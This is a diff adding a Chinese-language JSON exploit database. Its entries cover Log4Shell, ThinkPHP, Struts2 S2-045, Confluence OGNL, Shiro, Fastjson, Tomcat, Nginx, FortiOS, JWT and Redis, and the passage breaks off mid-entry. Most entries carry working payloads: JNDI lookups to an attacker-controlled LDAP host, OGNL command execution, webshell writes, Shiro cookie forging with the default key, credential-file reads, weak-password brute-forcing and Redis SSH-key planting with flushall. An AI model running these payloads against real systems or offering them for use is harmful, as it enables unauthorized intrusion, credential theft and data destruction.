@@ -1,0 +1,779 @@
+[
+  {
+    "id": "",
+    "name": "Apache Log4j2 JNDI 注入远程代码执行（Log4Shell）",
+    "description": "Log4j2 的消息查找 substitution 机制允许日志内容中的 ${jndi:ldap://...} 触发 JNDI 远程类加载。攻击者只需让目标记录一条可控字符串（User-Agent、参数、HTTP 头），即可在受影响版本上实现无交互 RCE。影响面覆盖全球大量 Java 服务，是 2021 年最严重漏洞。",
+    "vulnType": "rce",
+    "affected": "Apache Log4j 2.0-beta9 ~ 2.14.1（2.15.0 部分缓解，2.17.0 修复递归，2.17.1 完整修复 RC1 问题）",
+    "severity": "critical",
+    "publishedAt": "2021-12-10",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-44228"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2021-45046"
+      },
+      {
+        "type": "EDB-ID",
+        "value": "50592"
+      }
+    ],
+    "treePath": "web-app/rce/web-app-rce-log4shell",
+    "exploitCode": [
+      {
+        "title": "存在性探测（DNS 回连判定）",
+        "language": "bash",
+        "code": "# 将域名替换为你控制的 DNSLog/DNS 回连域名\ncurl -sk \"http://target.local/\" -H 'X-Api-Version: ${jndi:ldap://log4shell.xxx.dnslog.cn/a}' --max-time 5\n\n# 常见可注入位置：User-Agent / X-Forwarded-For / Referer / 表单参数 / Authorization: Bearer ${jndi:...}",
+        "description": "通过 DNS 回连确认目标存在 JNDI 查找行为，不触发类加载，适合安全验证。"
+      },
+      {
+        "title": "LDAP 恶意 LDAP 服务端利用路径（教学示意）",
+        "language": "python",
+        "code": "# 示意：目标 JDK < 8u191 且 trustURLCodebase 未关闭时，LDAP 引用指向托管恶意类的 HTTP 服务\n# 利用链：${jndi:ldap://attacker.local:1389/Exploit}\n#   1. 目标解析表达式并发起 LDAP 请求\n#   2. LDAP 服务返回带有 javaCodeBase 的引用\n#   3. 目标下载并实例化 Exploit.class，执行其静态初始化块中的命令\n#\n# 本地验证（自建LDAP用 marshalsec）：\n# java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.local:8888/#Exploit 1389\n# Exploit.java 静态块：Runtime.getRuntime().exec(\"touch /tmp/pwned\");",
+        "description": "教学演示利用链组成，展示需要哪些组件与前提条件。"
+      }
+    ],
+    "prerequisites": "目标使用受影响 Log4j2 版本且记录了攻击者可控字符串；JDK 版本决定能否直接加载远程类（高版本 JDK 默认禁用远程 codebase，需换用本地 Gadget 链如 BeanFactory）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+      "https://logging.apache.org/log4j/2.x/security.html",
+      "https://github.com/apache/logging-log4j2/commit/e4c40e7"
+    ],
+    "tags": [
+      "log4j",
+      "java",
+      "jndi",
+      "log4shell",
+      "rce",
+      "ldap"
+    ],
+    "attribution": {
+      "source": "Apache 官方通告与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "ThinkPHP 5.x 路由正则缺陷远程代码执行",
+    "description": "ThinkPHP 5.x 的路由解析在 controller 未强制命名空间校验时，可用 \\ 调用任意类方法。/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo 直接执行任意函数，是国内面最广的 PHP RCE 之一。",
+    "vulnType": "rce",
+    "affected": "ThinkPHP 5.0.x < 5.0.23、5.1.x < 5.1.31（核心利用形态）",
+    "severity": "critical",
+    "publishedAt": "2018-12",
+    "vulnerabilityIds": [
+      {
+        "type": "CNVD",
+        "value": "CNVD-2018-24942"
+      }
+    ],
+    "treePath": "web-app/rce/web-app-rce-thinkphp",
+    "exploitCode": [
+      {
+        "title": "invokefunction 直接执行函数",
+        "language": "http",
+        "code": "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami HTTP/1.1\nHost: target.local\n\n# 或使用兼容模式获取 phpinfo：\n# /index.php?s=/index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
+        "description": "URL 中类名经命名空间解析直达任意静态调用，响应即回显命令结果。"
+      },
+      {
+        "title": "log 文件包含变体（5.0.x 部分版本）",
+        "language": "http",
+        "code": "GET /index.php?s=/index/\\think\\Lang/load&file=../runtime/log/202601/01.log HTTP/1.1\nHost: target.local\n\n# 前置：已通过报错写入 ${@phpinfo()} 形式的 PHP 代码到日志\n# 配合包含实现 RCE，适用于 invokefunction 被修补的场景",
+        "description": "利用日志写入 + 文件包含组合的变体路径。"
+      }
+    ],
+    "prerequisites": "目标为 ThinkPHP 5.x 且未修复路由解析；Web 进程具备命令执行权限；框架 debug/异常处理未拦截反斜杠类名。",
+    "references": [
+      "https://www.thinkphp.cn/topic/62861.html",
+      "https://github.com/top-think/framework/commit/1ac1a147"
+    ],
+    "tags": [
+      "thinkphp",
+      "php",
+      "rce",
+      "invokefunction"
+    ],
+    "attribution": {
+      "source": "ThinkPHP 官方修复公告与社区分析",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "ThinkPHP 多语言特性本地文件包含远程代码执行",
+    "description": "ThinkPHP 6.x 多语言特性开启时，lang 参数拼入 include 路径且未过滤 ..，可穿越包含任意文件；结合 Pearcmd.php（Docker/pear 环境）可将攻击者参数写入文件再包含，实现稳定 RCE。",
+    "vulnType": "rce",
+    "affected": "ThinkPHP 6.0.1 ~ 6.0.13、6.1.x（多语言特性开启）",
+    "severity": "critical",
+    "publishedAt": "2022-12",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-47945"
+      }
+    ],
+    "treePath": "web-app/rce/web-app-rce-thinkphp",
+    "exploitCode": [
+      {
+        "title": "pearcmd 写文件 + 包含组合利用",
+        "language": "http",
+        "code": "GET /?lang=../../../../usr/local/lib/php/pearcmd&+config-create+/<?=system($_GET[0])?>+/tmp/x.php HTTP/1.1\nHost: target.local\n\nGET /?lang=../../../../tmp/x.php&0=whoami HTTP/1.1\nHost: target.local\n\n# 两步：第一步借助 pearcmd 参数解析把 webshell 写入 /tmp/x.php；第二步包含该文件执行。",
+        "description": "文件包含与 pearcmd 写文件组合的经典利用链。"
+      }
+    ],
+    "prerequisites": "多语言特性开启（think-multi-lang）且 lang 参数可控；知晓 pearcmd.php 绝对路径（Docker 官方 PHP 镜像默认存在）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-47945",
+      "https://github.com/top-think/framework/commit/f6b2a7ff"
+    ],
+    "tags": [
+      "thinkphp",
+      "php",
+      "lfi",
+      "pearcmd",
+      "rce"
+    ],
+    "attribution": {
+      "source": "NVD 与公开分析文章",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Apache Struts2 Jakarta Multipart 解析器 OGNL 注入（S2-045）",
+    "description": "Struts2 Jakarta Multipart 解析器在处理上传异常时将 Content-Type 错误信息送入 OGNL 求值。构造恶意 Content-Type 即可执行任意 OGNL 表达式，无需上传成功，一个请求即可 RCE。",
+    "vulnType": "rce",
+    "affected": "Struts 2.3.5 ~ 2.3.31、2.5 ~ 2.5.10（Struts 2.3.32 / 2.5.10.1 修复）",
+    "severity": "critical",
+    "publishedAt": "2017-03-06",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2017-5638"
+      },
+      {
+        "type": "EDB-ID",
+        "value": "41570"
+      }
+    ],
+    "treePath": "web-app/rce/web-app-rce-struts2",
+    "exploitCode": [
+      {
+        "title": "Content-Type OGNL 命令执行",
+        "language": "http",
+        "code": "POST / HTTP/1.1\nHost: target.local\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\nContent-Length: 0\n\n",
+        "description": "OGNL 清除安全成员访问后启动进程并回显到响应流。"
+      }
+    ],
+    "prerequisites": "目标使用 Struts2 且启用 Jakarta multipart 插件；响应为直接输出流时回显，否则可用 DNS/延时外带确认。",
+    "references": [
+      "https://cwiki.apache.org/confluence/display/WW/S2-045",
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-5638"
+    ],
+    "tags": [
+      "struts2",
+      "java",
+      "ognl",
+      "s2-045",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Apache Struts 官方安全公告 S2-045",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Atlassian Confluence OGNL 注入远程代码执行",
+    "description": "Confluence Server/Data Center 在处理 /pages/doenterpagevariables.action 等入口时，将请求参数值送入 OGNL 求值（沙箱绕过链）。单个 GET/POST 参数即可执行任意命令，无需认证。",
+    "vulnType": "rce",
+    "affected": "Confluence Server/Data Center 1.3.0 ~ 7.4.16、7.13.x < 7.13.7、7.17.x < 7.17.4 等",
+    "severity": "critical",
+    "publishedAt": "2022-06-02",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-26134"
+      },
+      {
+        "type": "EDB-ID",
+        "value": "50945"
+      }
+    ],
+    "treePath": "web-app/rce/web-app-rce-confluence",
+    "exploitCode": [
+      {
+        "title": "URL 参数 OGNL 命令回显",
+        "language": "http",
+        "code": "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.-%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Thread%40currentThread%28%29.getContextClassLoader%28%29.getResource%28%22%22%29.getContent%28%29%29%29.%28%40java.net.URLEncoder%40encode%28%23a%29%29%7D/ HTTP/1.1\nHost: target.local\n\n# 解码后核心为：${(#a=@org.apache.commons.io.IOUtils@toString(java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\")).(#@java.net.URLEncoder@encode(#a))}",
+        "description": "把命令输出 URL 编码后拼回 URL 路径实现回显。"
+      }
+    ],
+    "prerequisites": "目标运行受影响版本的 Confluence Server/DC（云版不受影响）；入口路径未被网关重写破坏。",
+    "references": [
+      "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130367656.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-26134"
+    ],
+    "tags": [
+      "confluence",
+      "atlassian",
+      "ognl",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Atlassian 官方安全公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Apache Shiro RememberMe 反序列化（Shiro-550）",
+    "description": "Shiro 默认使用硬编码 AES 密钥 kPH+bIxk5D2deZiIxcaaaA== 加密 RememberMe Cookie。拿到密钥即可构造序列化对象经 AES-CBC 加密回传，触发 Java 反序列化 RCE。配合常见依赖 Gadget（CommonsBeanutils/CommonsCollections）利用。",
+    "vulnType": "deserialization",
+    "affected": "Apache Shiro < 1.2.4（默认密钥）；< 1.4.2（AES-CBC 可预测 GCM 切换前）；1.4.2+ 若密钥泄露仍可利用",
+    "severity": "critical",
+    "publishedAt": "2016-05",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2016-4437"
+      },
+      {
+        "type": "EDB-ID",
+        "value": "49079"
+      }
+    ],
+    "treePath": "web-app/deserialization/web-app-deserialization-shiro",
+    "exploitCode": [
+      {
+        "title": "RememberMe Cookie 构造与发送（检测密钥）",
+        "language": "python",
+        "code": "import base64, uuid\nfrom Crypto.Cipher import AES\n\ndef shiro_cookie(payload: bytes, key: bytes = b'kPH+bIxk5D2deZiIxcaaaA==') -> str:\n    BS = AES.block_size\n    iv = uuid.uuid4().bytes\n    pad = lambda s: s + (BS - len(s) % BS) * bytes([BS - len(s) % BS])\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    return base64.b64encode(iv + cipher.encrypt(pad(payload))).decode()\n\n# payload 为 ysoserial 生成的 Gadget 序列化数据，例如：\n# java -jar ysoserial.jar CommonsBeanutils1 'touch /tmp/shiro550' > payload.bin\n# 发送：Cookie: rememberMe=<shiro_cookie(open('payload.bin','rb').read())>",
+        "description": "CBC 模式加解密与默认密钥的检测/利用流程。"
+      }
+    ],
+    "prerequisites": "目标使用 Shiro RememberMe；密钥为默认值或已泄露；classpath 存在可用 Gadget 依赖；可出网或使用无依赖 Gadget（如 CBEUI）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2016-4437",
+      "https://shiro.apache.org/security-reports.html"
+    ],
+    "tags": [
+      "shiro",
+      "java",
+      "deserialization",
+      "rememberme",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Apache Shiro 官方安全报告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Fastjson autoType 绕过反序列化远程代码执行",
+    "description": "Fastjson 的 JSON.parseObject 在 autoType 关闭后仍可通过 @type 与缓存/继承关系绕过（1.2.47 恒真绕过等），配合 JNDI Gadget 实现远程类加载。攻击载荷通常来自 HTTP 参数直接进入 parseObject 的接口。",
+    "vulnType": "deserialization",
+    "affected": "Fastjson <= 1.2.47（CNVD-2019-22238 autoType 绕过，1.2.48 修复）；Fastjson < 1.2.83（CVE-2022-25845 autoType 绕过，1.2.83 修复）；Fastjson2 重构后不受影响",
+    "severity": "critical",
+    "publishedAt": "2019-07",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-25845"
+      },
+      {
+        "type": "CNVD",
+        "value": "CNVD-2019-22238"
+      }
+    ],
+    "treePath": "web-app/deserialization/web-app-deserialization-fastjson",
+    "exploitCode": [
+      {
+        "title": "1.2.47 恒真绕过探测载荷",
+        "language": "http",
+        "code": "POST /api/parse HTTP/1.1\nHost: target.local\nContent-Type: application/json\n\n{\n  \"a\": {\n    \"@type\": \"java.lang.Class\",\n    \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n  },\n  \"b\": {\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://attacker.local:1389/TExploit\",\n    \"autoCommit\": true\n  }\n}\n\n# 类缓存机制使 JdbcRowSetImpl 绕过 autoType 黑名单；JDK 高版本需切本地 Gadget。",
+        "description": "利用 java.lang.Class 缓存注入类型再实例化 JNDI Gadget。"
+      }
+    ],
+    "prerequisites": "接口将用户 JSON 传入 Fastjson parse/parseObject；目标出网可达 LDAP/RMI 或具备本地 Gadget；JDK 版本决定远程类加载可行性。",
+    "references": [
+      "https://github.com/alibaba/fastjson/commit/b91c9eac",
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-25845"
+    ],
+    "tags": [
+      "fastjson",
+      "java",
+      "deserialization",
+      "autotype",
+      "jndi"
+    ],
+    "attribution": {
+      "source": "GitHub 官方仓库修复提交",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Apache Tomcat PUT 写文件（read-only 缺省绕过）",
+    "description": "Tomcat 配置了可写 PUT 且 read-only=false 时，JspServlet 映射的路径可用 NTFS ADS 形式绕过只读判断写入 JSP 文件，随后请求执行代码。",
+    "vulnType": "file-upload",
+    "affected": "Apache Tomcat 7.0.0 ~ 7.0.79（Windows + 启用 PUT + JSP Servlet 映射）",
+    "severity": "high",
+    "publishedAt": "2017-09-19",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2017-12615"
+      }
+    ],
+    "treePath": "web-app/file-upload/web-app-file-upload-tomcat-put",
+    "exploitCode": [
+      {
+        "title": "ADS 绕过写入 JSP",
+        "language": "http",
+        "code": "PUT /shell.jsp/ HTTP/1.1\nHost: target.local\nContent-Length: 33\n\n<% out.println(new java.io.File(\".\").getAbsolutePath());%>\n\n# 备选形态：/shell.jsp%20 或 /shell.jsp::$DATA\n# 写入后 GET /shell.jsp 触发 JspServlet 编译执行。",
+        "description": "三种绕过只读检查的文件名形态，写入即得 RCE。"
+      }
+    ],
+    "prerequisites": "Windows 部署；web.xml 对 jsp 配置 writable 且 read-only=false（常见于错误配置）；应用目录可写。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-12615",
+      "https://lists.apache.org/thread/2b3ywgcr7qzv0nscd6rcthlhq0lkmz9g"
+    ],
+    "tags": [
+      "tomcat",
+      "java",
+      "put",
+      "jsp",
+      "file-upload"
+    ],
+    "attribution": {
+      "source": "Apache Tomcat 官方公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Nginx alias 目录穿越（off-by-slash）",
+    "description": "Nginx location 配置 alias 指令时，若 location 以 / 结尾而 alias 路径不以 / 结尾（或反之），会形成路径拼接错位；配合 /../ 即可穿越到上级目录读取任意文件。",
+    "vulnType": "path-traversal",
+    "affected": "Nginx 所有版本的错误 alias 配置（如 location /i { alias /data/w3/images/; }）",
+    "severity": "medium",
+    "publishedAt": "2019-02",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2019-20372"
+      }
+    ],
+    "treePath": "web-app/path-traversal/web-app-path-traversal-nginx-alias",
+    "exploitCode": [
+      {
+        "title": "穿越读取配置与系统文件",
+        "language": "http",
+        "code": "GET /i../nginx/conf/nginx.conf HTTP/1.1\nHost: target.local\n\nGET /i../etc/passwd HTTP/1.1\nHost: target.local\n\n# location /i { alias /data/w3/images/; }（alias 带尾斜杠）拼接后 /data/w3/images/../etc/passwd，/i../ 穿越到上级目录\n# 每多一层 ../ 就多向上一级，逐步探测到根。",
+        "description": "按拼接错位逐级 ../ 穿越读取敏感文件。"
+      }
+    ],
+    "prerequisites": "目标存在 alias 与 location 尾斜杠不匹配的配置；上级目录未被其他 location 拦截。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2019-20372",
+      "https://trac.nginx.org/nginx/ticket/1647"
+    ],
+    "tags": [
+      "nginx",
+      "path-traversal",
+      "misconfiguration"
+    ],
+    "attribution": {
+      "source": "Nginx 官方 Trac 与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Apache Shiro RememberMe Padding Oracle 反序列化（Shiro-721）",
+    "description": "Shiro 使用 AES-CBC 加密 RememberMe 时存在 Padding Oracle：服务端对解密失败的响应差异可被用来逐字节伪造任意密文，无需知道密钥即可构造合法的反序列化 Cookie，配合 Gadget 实现 RCE。修复方案是切换 AES-GCM。",
+    "vulnType": "auth-bypass",
+    "affected": "Apache Shiro < 1.4.2",
+    "severity": "high",
+    "publishedAt": "2019-11",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2019-12422"
+      }
+    ],
+    "treePath": "auth-session/auth-bypass/auth-session-auth-bypass-shiro-key",
+    "exploitCode": [
+      {
+        "title": "Padding Oracle 伪造流程（利用示意）",
+        "language": "python",
+        "code": "# 前置：持有若干合法 rememberMe 密文（登录后获得），可发起大量探测请求\n# 步骤：\n# 1. 取 ysoserial 序列化 Gadget payload\n# 2. 按 CBC 分组从最后一个块向前伪造：对上一块的每个字节尝试 256 个值，\n#    观察服务端返回\"解密填充错误\"与\"反序列化错误\"的响应差异（oracle）\n# 3. 收敛后得到与目标明文等长的合法密文链，替换 rememberMe Cookie 发送\n#\n# 判定 oracle：\n#   - 响应含 \"rememberMe was deleted\" 或 Set-Cookie 删除 → 填充错\n#   - 响应 500/反序列化异常 → 填充正确但内容非法，继续\n# 时间成本约 4-8 小时/请求面，适合无默认密钥的老版本。",
+        "description": "以响应差异为 oracle 逐块伪造密文的完整流程说明。"
+      }
+    ],
+    "prerequisites": "Shiro < 1.4.2 且使用 CBC；能稳定区分两种解密错误响应；classpath 有可用 Gadget；对请求量无强限制。",
+    "references": [
+      "https://shiro.apache.org/security-reports.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2019-12422"
+    ],
+    "tags": [
+      "shiro",
+      "padding-oracle",
+      "deserialization",
+      "auth-bypass"
+    ],
+    "attribution": {
+      "source": "Apache Shiro 官方安全报告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "jsonwebtoken alg 混淆（RS256→HS256 密钥混淆）",
+    "description": "node-jsonwebtoken 等库在校验逻辑缺陷下允许用公钥作为 HMAC 密钥验证攻击者签发的 HS256 token：攻击者把算法改为 HS256 并用已知的 RSA 公钥签名，服务端按 HMAC 公钥验证即通过，伪造任意身份。",
+    "vulnType": "auth-bypass",
+    "affected": "node-jsonwebtoken < 4.2.2 等未强制算法白名单的 JWT 实现",
+    "severity": "high",
+    "publishedAt": "2015-08",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2015-9235"
+      }
+    ],
+    "treePath": "auth-session/auth-bypass/auth-session-auth-bypass-jwt-none",
+    "exploitCode": [
+      {
+        "title": "HS256 公钥伪造 token",
+        "language": "python",
+        "code": "import jwt\n\npublic_key = open('public.pem').read()\ntoken = jwt.encode(\n    {\"sub\": \"admin\", \"role\": \"admin\"},\n    key=public_key,\n    algorithm=\"HS256\",\n)\nprint(token)\n\n# 发送 Authorization: Bearer <token>\n# 成功条件：服务端验证未限定算法白名单，secret 被替换为公钥 PEM 文本。",
+        "description": "把公钥当 HMAC 密钥签发伪造 token 的完整脚本。"
+      }
+    ],
+    "prerequisites": "公钥可获取（JWKS 端点/证书泄露）；服务端解码时未固定 alg；JWT payload 中身份字段可控。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2015-9235",
+      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+    ],
+    "tags": [
+      "jwt",
+      "hs256",
+      "algorithm-confusion",
+      "auth-bypass"
+    ],
+    "attribution": {
+      "source": "Auth0 官方分析与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Fortinet FortiOS SSL VPN 凭据文件读取（认证前置）",
+    "description": "FortiOS 的 SSL VPN Web 服务存在路径混淆缺陷，利用特殊路径组合可直接读取 vpn 目录下的系统文件。读取 /dev/cmdb/sslvpn_websession 文件可获得 VPN 用户的会话凭证，实现免密登录内网，是攻防对抗中高价值的入口型漏洞。",
+    "vulnType": "auth-bypass",
+    "affected": "FortiOS 5.4.1 ~ 5.4.6、5.6.3 ~ 5.6.8、6.0.0 ~ 6.0.4（5.4.7 / 5.6.9 / 6.0.5 修复）",
+    "severity": "critical",
+    "publishedAt": "2018-11",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2018-13379"
+      }
+    ],
+    "treePath": "auth-session/auth-bypass/auth-session-auth-bypass-vpn-ssl",
+    "exploitCode": [
+      {
+        "title": "资源路径混淆读取会话文件",
+        "language": "http",
+        "code": "GET /remote/fgt_lang?lang=/../../../..//dev/cmdb/sslvpn_websession HTTP/1.1\nHost: target.local\n\n# 响应二进制内容按定长结构解析出 username/password（AES 解密前的明文片段）。\n# 部分版本用 /remote/error?errmsg=121101 等 lang 读取点组合利用。",
+        "description": "lang 参数穿越到设备 cmdb 文件读取已登录用户凭据。"
+      }
+    ],
+    "prerequisites": "目标运行受影响 FortiOS 且 SSL VPN 开放；websession 文件存在已登录会话记录。",
+    "references": [
+      "https://fortiguard.com/psirt/FG-IR-18-384",
+      "https://nvd.nist.gov/vuln/detail/CVE-2018-13379"
+    ],
+    "tags": [
+      "fortigate",
+      "ssl-vpn",
+      "path-traversal",
+      "credential-access"
+    ],
+    "attribution": {
+      "source": "Fortinet 官方 PSIRT 公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Tomcat Manager 弱口令与 WAR 部署利用",
+    "description": "Tomcat Manager 应用常用弱口令（tomcat:tomcat、admin:admin 等）防护。登录 manager/text 接口后可直接 PUT 部署 WAR 包，内含 JSP 即获得服务器代码执行。这是无 CVE 但极高发的默认凭据问题。",
+    "vulnType": "default-credentials",
+    "affected": "Apache Tomcat 全版本（依赖部署配置与凭据强度，与版本无关）",
+    "severity": "high",
+    "publishedAt": "2020",
+    "vulnerabilityIds": [],
+    "treePath": "auth-session/default-credentials/auth-session-default-credentials-tomcat-manager",
+    "exploitCode": [
+      {
+        "title": "弱口令探测与 WAR 部署",
+        "language": "bash",
+        "code": "# 1) 弱口令字典探测（HTTP Basic）\nfor cred in tomcat:tomcat admin:admin admin:123456 manager:manager role1:role1; do\n  user=${cred%%:*}; pass=${cred##*:}\n  code=$(curl -sk -o /dev/null -w '%{http_code}' -u \"$user:$pass\" http://target.local/manager/text/list)\n  [ \"$code\" = \"200\" ] && echo \"[+] valid: $cred\" && break\ndone\n\n# 2) 部署 WAR（war 内放 webshell.jsp）\ncurl -sk -u \"$user:$pass\" \\\n  --upload-file app.war \\\n  \"http://target.local/manager/text/deploy?path=/demo\"\n\n# 3) 触发\ncurl -sk http://target.local/demo/webshell.jsp?cmd=whoami",
+        "description": "从弱口令到 WAR 部署的三步完整链路。"
+      }
+    ],
+    "prerequisites": "manager 应用未移除且暴露；凭据在弱口令字典内；manager-script/manager-gui 角色可部署。",
+    "references": [
+      "https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html",
+      "https://cwe.mitre.org/data/definitions/798.html"
+    ],
+    "tags": [
+      "tomcat",
+      "default-credentials",
+      "manager",
+      "war-deploy"
+    ],
+    "attribution": {
+      "source": "Apache Tomcat 官方文档与 CWE-798",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Redis 未授权访问写文件远程代码执行",
+    "description": "Redis 未设置 requirepass 且绑定 0.0.0.0 时，任何人可 SET 键值并通过 CONFIG SET dir/dbfilename 将数据落盘到任意路径。经典三条利用链：写 SSH authorized_keys、写 Web 目录 shell、写 crontab 反弹。均以写文件为核心。",
+    "vulnType": "access-control",
+    "affected": "Redis 全版本（未授权或弱口令 + 可写落盘路径）",
+    "severity": "critical",
+    "publishedAt": "2016",
+    "vulnerabilityIds": [],
+    "treePath": "database/access-control/database-access-control-redis-unauth",
+    "exploitCode": [
+      {
+        "title": "CONFIG SET 落盘写 SSH key",
+        "language": "bash",
+        "code": "# 前置：6379 可未授权连接且 redis 进程对 /root/.ssh 有写权限\nredis-cli -h target.local flushall\nredis-cli -h target.local set x '\\n\\nssh-rsa AAAA...公钥内容... attacker@local\\n\\n'\nredis-cli -h target.local config set dir /root/.ssh/\nredis-cli -h target.local config set dbfilename authorized_keys\nredis-cli -h target.local save\n\n# 之后：ssh -i 私钥 root@target.local\n# Web 场景：dir 指向 web 根目录、dbfilename 指向 shell.php 并在 value 中夹带代码\n# crontab 场景：dir /var/spool/cron/ dbfilename root（低版本 redis + cron 服务存在时）",
+        "description": "⚠ flushall 会清空目标 Redis 全部数据，仅在授权测试环境使用；生产验证优先用 SET test-key 探测写权限。以落盘为核心的 Redis 未授权利用三件套。"
+      }
+    ],
+    "prerequisites": "Redis 未授权/弱口令可达；CONFIG SET 未被 rename 禁用；目标存在可写且可触达的落盘消费方（sshd/httpd/crond）。",
+    "references": [
+      "https://redis.io/docs/management/security/",
+      "https://cwe.mitre.org/data/definitions/284.html"
+    ],
+    "tags": [
+      "redis",
+      "unauthorized",
+      "file-write",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Redis 官方安全文档与社区公开实践",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Debian 系 Redis Lua 沙箱逃逸远程代码执行",
+    "description": "Debian/Ubuntu 发行版给 Redis 打的 Lua 补丁移除了沙箱隔离，使 EVAL 允许加载任意 Lua 包。通过 package.loadlib 直接调用 libc 的 system 符号执行命令，无需写文件权限，修补了未授权写文件链失效后的利用面。",
+    "vulnType": "rce",
+    "affected": "Debian stretch 3.2.6-3+deb9u5 修复前 / buster 5.0.14-1+deb10u2 修复前 / bullseye 6.0.16-1+deb11u2 修复前（Ubuntu 非官方补丁版本同样受影响）",
+    "severity": "critical",
+    "publishedAt": "2022-02-22",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-0543"
+      }
+    ],
+    "treePath": "database/rce/database-rce-redis-lua",
+    "exploitCode": [
+      {
+        "title": "EVAL loadlib 调用 system",
+        "language": "bash",
+        "code": "redis-cli -h target.local eval 'local f=loadfile or loadlib; local l=package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io=l(); local res=io.popen(\"whoami\"); local out=res:read(\"*a\"); return out' 0\n\n# 关键：package.loadlib 加载系统 Lua 库恢复 io 库，再 popen 执行命令并回显。",
+        "description": "绕过沙箱恢复被剥离的 io 库并执行系统命令。"
+      }
+    ],
+    "prerequisites": "Redis 为 Debian/Ubuntu 发行版包（官方源修复后不受影响）；未授权 EVAL 或具备 authenticated 会话。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-0543",
+      "https://www.debian.org/security/2022/dsa-5081"
+    ],
+    "tags": [
+      "redis",
+      "lua",
+      "sandbox-escape",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Debian 官方安全公告 DSA-5081",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "MongoDB 未授权访问数据窃取",
